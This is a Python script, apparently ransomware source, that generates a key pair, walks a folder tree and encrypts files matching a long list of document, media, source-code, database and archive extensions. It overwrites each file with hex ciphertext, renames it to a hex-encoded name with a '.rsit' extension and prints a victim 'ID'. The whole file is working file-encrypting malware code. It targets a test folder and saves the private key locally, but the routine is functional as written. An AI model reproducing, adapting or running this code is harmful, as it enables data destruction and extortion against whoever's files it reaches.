"""

Steps :
# Generate random ID
# Generate key pair from random ID
# Encrypt data with public key

"""

import uuid
import binascii
import os
from pathlib import Path
from nacl.public import SealedBox, PrivateKey

class Cryptographer:
    """
    Encrypt folders from / path
    """

    FILE_EXTENSION = ".rsit"

    def __init__(self, public_key):
        self.box = SealedBox(public_key)

    def encrypt_data(self, filename):
        """
        Encrypt data using the public key
        """

        # Get data from file
        try:
            with open(filename, 'rb') as file:
                data = file.read()

            # Encrypt data
            encrypted_data = self.box.encrypt(data)

            # Encode data to hex
            encoded_encrypted_data = binascii.hexlify(encrypted_data)

            # Write encrypted_data to file
            with open(filename, 'wb') as file:
                file.write(encoded_encrypted_data)
        except FileNotFoundError:
            pass


    ############################################
    #           Encode/Decode Filename         #
    ############################################


    def encode_filename(self, filename):
        """
        Encode filename
        """
        path = Path(filename)
        path = str(path.parent).encode()

        # Encode filename in hex value
        encoded_filename = binascii.hexlify(filename.encode())

        try:
            # Rename file
            os.rename(filename, path+b'/'+encoded_filename+str.encode(self.FILE_EXTENSION))
        except OSError:
            pass


    ############################################
    #          Encrypt/Decrypt Folders         #
    ############################################


    def encrypt_folder(self, path):
        """
        Encrypt files in folder and subfolders from path
        """

        # Extension list
        extensions = [
            # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
            # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',

            # images
            'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw',
            # music and sound
            'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',
            # Video and movies
            'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',

            # Microsoft office
            'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',
            # OpenOffice, Adobe, Latex, Markdown, etc
            'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md',
            'yml', 'yaml', 'json', 'xml', 'csv',  # structured data
            'db', 'sql', 'dbf', 'mdb', 'iso',  # databases and disc images

            'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',  # web technologies
            'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',  # C source code
            'java', 'class', 'jar',  # java source code
            'ps', 'bat', 'vb',  # windows based scripts
            'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',  # linux/mac based scripts
            'go', 'py', 'pyc', 'bf', 'coffee',  # other source code files

            'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
        ]

        # Encrypt and encode all files in folders with specified extensions
        for root, _, files in os.walk(path, topdown=True):
            for filename in files:
                # for i in range(len(extensions)):  # Verify each extension
                for index, _value in enumerate(extensions):
                    extension = '.'+extensions[index]
                    if extension in filename:
                        target = root+'/'+filename  # Write path+filename
                        self.encrypt_data(target)  # Encrypt Data
                        self.encode_filename(target)  # Encode Filename

class Key:
    """
    Key class manage a key pair
    """

    def __init__(self):
        self.generate_key()
        self.key_id = uuid.uuid4()
        self.write_key()

    def generate_key(self):
        """
        Generate keys with ED25519 algorithm and put into variables
        """
        self.private = PrivateKey.generate()
        self.public = self.private.public_key

    def write_key(self):
        """
        Write key values into files
        """

        with open('%s_private.key' % self.key_id, 'wb') as file:
            file.write(self.private.encode())

        with open('%s_public.key' % self.key_id, 'wb') as file:
            file.write(self.public.encode())


if __name__ == "__main__":

    # CONSTANT
    TARGET_PATH = "/home/USERNAME/Documents/CrashTest"

    # Create instances
    key = Key()
    crypto = Cryptographer(key.public)

    # Encrypt folder
    crypto.encrypt_folder(TARGET_PATH)

    # Display ID
    print("Your ID : " + str(key.key_id))
